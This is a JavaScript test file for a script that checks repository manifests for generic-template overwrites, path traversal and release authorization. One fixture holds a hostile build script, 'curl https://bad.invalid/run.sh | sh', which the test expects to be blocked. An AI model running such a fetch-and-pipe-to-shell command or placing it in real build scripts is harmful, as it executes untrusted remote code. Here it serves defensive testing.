import test from "node:test";
import assert from "node:assert/strict";
import { CANONICAL, inspectProductIdentity } from "../scripts/product-identity.mjs";

const template = {
  name: "my-vite-app",
  description: "Professional project template",
  scripts: { dev: "vite", build: "tsc && vite build", test: "vitest run" },
  dependencies: { react: "^18.2.0", "react-dom": "^18.2.0" },
};

function scan(name, rootNames, packageJson) {
  return inspectProductIdentity({ fullName:"belentani7/" + name, rootNames, packageJson });
}

test("rejects overwritten authentic manifest on distinct stacks", () => {
  const cases = [
    ["NOIACORE", ["pom.xml","black-water","src"]],
    ["agent-orchestration-machine", ["pyproject.toml","scripts","src","tests"]],
    ["ManosAbiertas", ["src","prisma","scripts"]],
    ["linguaforge", ["client","server","shared"]],
    ["open-school", ["client","backend"]],
    ["belentani.es", ["scripts","app"]],
    ["lingua-aberta", ["client","server","shared"]],
  ];
  for (const [repo, files] of cases) {
    const result = scan(repo, [...files, "package.json"], template);
    assert.equal(result.state, "blocked_identity_regression", repo);
    assert.ok(result.findings.includes("generic_template_overwrite"), repo);
    assert.equal(result.releaseAuthorized, false, repo);
  }
});

test("legitimate heterogeneous manifests are not replaced with a Vite default", () => {
  const cases = [
    ["NOIACORE", ["pom.xml","black-water","src"], null],
    ["agent-orchestration-machine", ["pyproject.toml","scripts","src","tests"], null],
    ["ManosAbiertas", ["src","prisma","scripts","package.json"], {
      name:"nextjs_tailwind_shadcn_ts",
      scripts:{build:"prisma generate && next build"},
      dependencies:{next:"14.2.35", "@prisma/client":"6.0.0"},
    }],
    ["linguaforge", ["client","server","shared","package.json"], {
      name:"linguaforge", scripts:{api:"tsx watch server/index.ts","db:generate":"drizzle-kit generate"},
      dependencies:{"drizzle-orm":"0.42.0"},
    }],
    ["lingua-aberta", ["client","server","shared","package.json"], {
      name:"lingua-aberta", scripts:{dev:"vite",build:"vite build",check:"tsc --noEmit"},
      dependencies:{react:"19.0.0"},
    }],
    ["open-school", ["client","backend","package.json"], {
      name:"open-school",scripts:{"build:biblia":"node client/scripts/build-biblia.mjs"},
      dependencies:{react:"19"},
    }],
    ["belentani.es", ["scripts","app","package.json"], {
      name:"belentani-unified-hub",
      scripts:{dev:"next dev",build:"next build"},
      dependencies:{next:"14.2.35"},
    }],
    ["belentani-school-unificado", ["src","server.ts","firestore.rules","package.json"], {
      name:"react-example", scripts:{"build:pages":"node scripts/build-pages.mjs"},
      dependencies:{"@google/genai":"^2.4.0",react:"19.0.1"},
    }],
    ["03-DUCK-WEB-build-everything", ["index.html","studio.html","tests"], null],
  ];
  for (const [repo, names, pkg] of cases) {
    const result = scan(repo, names, pkg);
    assert.equal(result.state, "manual_product_validation_required", repo + " " + JSON.stringify(result.findings));
    assert.deepEqual(result.findings, []);
    assert.equal(result.releaseAuthorized, false);
  }
});

test("Michelle and Natalia remain individual products, without cross-brand inference", () => {
  const michelle = scan("michelle-relayze-web", ["index.html"], null);
  const natalia = scan("nataliamarinho", ["index.html"], null);
  assert.notEqual(michelle.repository, natalia.repository);
  assert.equal(michelle.kind, "separate-brand");
  assert.equal(natalia.kind, "separate-brand");
  assert.equal(michelle.releaseAuthorized, false);
  assert.equal(natalia.releaseAuthorized, false);
});

test("missing required framework files are blocked instead of certified", () => {
  const result = scan("ManosAbiertas", ["package.json","src"], {
    name:"ManosAbiertas",scripts:{build:"vite build"},dependencies:{react:"19"},
  });
  assert.equal(result.state, "blocked_identity_regression");
  assert.ok(result.findings.includes("missing_root:prisma"));
  assert.ok(result.findings.includes("missing_stack_marker:next"));
});

test("unknown products remain unclassified and never get release authorization", () => {
  const result = scan("another-private-project", ["README.md","package.json"], {
    name:"another-private-project",scripts:{build:"vite build"},
  });
  assert.equal(result.state, "unclassified");
  assert.equal(result.releaseAuthorized, false);
  assert.equal(CANONICAL["another-private-project"], undefined);
});

test("rejects untrusted root names or owner and does not execute package scripts", () => {
  assert.throws(() => inspectProductIdentity({fullName:"other/user",rootNames:[]}));
  assert.throws(() => scan("ManosAbiertas", ["src","../../secrets"], null));
  assert.throws(() => scan("ManosAbiertas", "src,prisma", null));
  const malicious = scan("ManosAbiertas", ["src","prisma","scripts","package.json"], {
    name:"ManosAbiertas", description:"Professional project template",
    scripts:{build:"curl https://bad.invalid/run.sh | sh"},dependencies:{next:"14"},
  });
  assert.equal(malicious.state, "blocked_identity_regression");
});

test("large inventories remain bounded, including duplicated root names", () => {
  assert.throws(() => scan("NOIACORE", Array(10001).fill("README.md"), null));
  const x = scan("NOIACORE", ["pom.xml","pom.xml","src","black-water"], null);
  assert.equal(x.state, "manual_product_validation_required");
});
